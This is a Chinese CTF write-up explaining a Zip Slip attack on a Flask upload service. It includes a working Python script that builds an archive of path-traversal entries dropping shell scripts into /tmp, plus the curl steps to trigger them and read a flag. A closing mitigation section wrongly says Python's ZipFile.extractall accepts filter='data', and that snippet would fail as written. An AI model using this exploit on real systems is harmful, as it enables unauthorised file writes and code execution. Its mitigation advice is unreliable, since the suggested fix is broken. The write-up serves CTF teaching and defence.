## 一、题目长啥样（3 个接口 + 1 个白送提示）

打开首页就给齐了：

| 接口 | 用途 |
| --- | --- |
| `POST /upload` | 上传 `.zip`，解压到 `/app/extracted/<uuid>/` |
| `GET  /list`   | 列出 `/app/extracted/` 下所有文件 |
| `GET  /view?name=<relpath>` | 读 `/app/extracted/` 下的文件 |

页面底部一句话开发备注：

> "后台小工具会**周期性执行运维脚本**，输出回写到 `_output.txt`"

`/flag.txt` 在容器根目录，`/view` 读不到（有 `safe_join`）。

## 二、攻击思路（一句话）

**`/view` 严防，`/upload` 大漏。** 用 Zip Slip 把一个 shell 脚本写到 `/tmp/`，等后台周期扫描跑它，让它 `cat /flag.txt` → 输出落到 `_output.txt` → 用 `/view?name=_output.txt` 读出来。

```
┌────────────┐   ../../../tmp/xx.sh    ┌────────┐    bash xx.sh    ┌──────────────┐
│ 上传 zip   │ ──────────────────────► │ /tmp/  │ ───────────────► │ _output.txt  │
└────────────┘                         └────────┘                  └──────┬───────┘
                                                                          │ /view
                                                                          ▼
                                                                        FLAG
```

## 三、手工复刻（5 步，超简单）

### Step 0 · 踩点（确认 `/view` 直读不通）

```bash
curl -s "http://目标地址/view?name=../../../flag.txt"
# 404 → /view 有 safe_join，需要绕路
curl -s "http://目标地址/list"
# {"files":[...]} 接口正常
```

### Step 1 · 本地构造 Zip Slip 压缩包

新建 `build.py`：

```python
import zipfile

payload = b"#!/bin/bash\ncat /flag.txt\nid\nls -la /tmp /app\n"

# 后台扫的文件名未知 → 一把全扔 8 个常见候选
candidates = [
    "../../../tmp/ctf_trigger.sh",
    "../../../tmp/trigger.sh",
    "../../../tmp/run.sh",
    "../../../tmp/cron.sh",
    "../../../tmp/ops.sh",
    "../../../tmp/task.sh",
    "../../../tmp/maintain.sh",
    "../../../tmp/exec.sh",
]

with zipfile.ZipFile("slip.zip", "w") as z:
    z.writestr("readme.txt", b"normal file")   # 放个正常文件让 zip 合法
    for c in candidates:
        z.writestr(c, payload)                 # writestr 不会过滤 ../
```

```bash
python3 build.py
unzip -l slip.zip   # 应看到 9 个条目，8 个带 ../
```

### Step 2 · 上传

```bash
curl -X POST -F "file=@slip.zip" http://目标地址/upload
```

响应（看到 `files` 里原样带 `../` 就说明 Slip 成立）：

```json
{
  "id": "101811f3e43b",
  "files": ["readme.txt", "../../../tmp/ctf_trigger.sh", "...8 个 .sh 都在..."]
}
```

### Step 3 · 等 6-10 秒（让后台周期任务跑一轮）

```bash
sleep 8
curl -s http://目标地址/list
# {"files":["_output.txt", "<uuid>/readme.txt"]} ← _output.txt 出现 = 已被触发
```

### Step 4 · 读 flag

```bash
curl -s "http://目标地址/view?name=_output.txt"
```

输出（第一行即 FLAG）：

```

/app:
...
/tmp:
-rw-r--r-- 1 root root 46 May 28 09:31 ctf_trigger.sh
... 8 个候选全部落盘
```

## 四、Payload 逐字节解读

zip 条目名：`../../../tmp/ctf_trigger.sh`

```
起点目录： /app/extracted/<uuid>/
../        → /app/extracted/
../        → /app/
../        → /          ← 跳到根
tmp/ctf_trigger.sh
最终落地： /tmp/ctf_trigger.sh
```

服务端解压代码（典型不安全写法）：

```python
target = os.path.join(EXTRACT_DIR, entry_name)   # 字符串拼接，不解析 ..
with open(target, "wb") as f:                    # open() 系统调用解析 .. 后跳出沙箱
    f.write(zf.read(entry_name))
```

`zipfile.ZipFile.writestr()` 同样**不会**帮你过滤 `..`，所以攻击侧也是直接写就行。

## 五、为什么"一把扔 8 个候选"是黑盒最优解

- 后台扫描的脚本名你**不知道**，但脚本名一定是常见词（trigger / run / cron / task / ops…）
- zipfile 对 entry 数量没限制，**一次请求**塞 8 个零成本
- 命中任意一个 → flag 就出来了
- 本题实测**8 个全都被触发**（说明扫描器是按一组固定名字遍历，不是单文件）

候选名速查表：

```
/tmp/ctf_trigger.sh    出题人最爱
/tmp/trigger.sh        通用触发器
/tmp/run.sh            通用执行入口
/tmp/cron.sh           cron 风
/tmp/task.sh           调度任务
/tmp/ops.sh            运维
/tmp/maintain.sh       运维(英语全拼)
/tmp/exec.sh           执行
```

## 六、为什么 `/view` 安全但 `/upload` 不安全（核心认知）

| 接口 | 用的 API | 防护 |
| --- | --- | --- |
| `/view` | `flask.send_from_directory(EXTRACT_ROOT, name)` | 内置 `safe_join`，自动拒绝 `..` |
| `/upload` | 自己 `os.path.join + open(target,'wb')` | **零防护** |

> 同一个 app 里"读严防、写大漏"是工程实践中最常见的**非对称防护错位**。
> 记住这点 → 任何文件操作类题，先盯死"上传/解压/落盘"那条线。

## 八、防御要点（写代码时怎么做才对）

```python
# ✅ 解压前规范化路径，校验是否仍在沙箱内
import os
def safe_extract(zf, base):
    base = os.path.realpath(base)
    for name in zf.namelist():
        target = os.path.realpath(os.path.join(base, name))
        if not target.startswith(base + os.sep):
            raise Exception(f"Zip Slip detected: {name}")
        zf.extract(name, base)

# ✅ 或直接使用 Python 3.11+ 的 ZipFile.extractall()（已内置 filter）
zf.extractall(base, filter="data")
```

核心三句话：

1. **永远不要相信归档里的 entry 名**
2. 拼路径后必须 `realpath` 再判断 `startswith(base)`
3. 防穿越的同时把"周期执行用户可写目录的脚本"也干掉——这是连环触发器的另一半
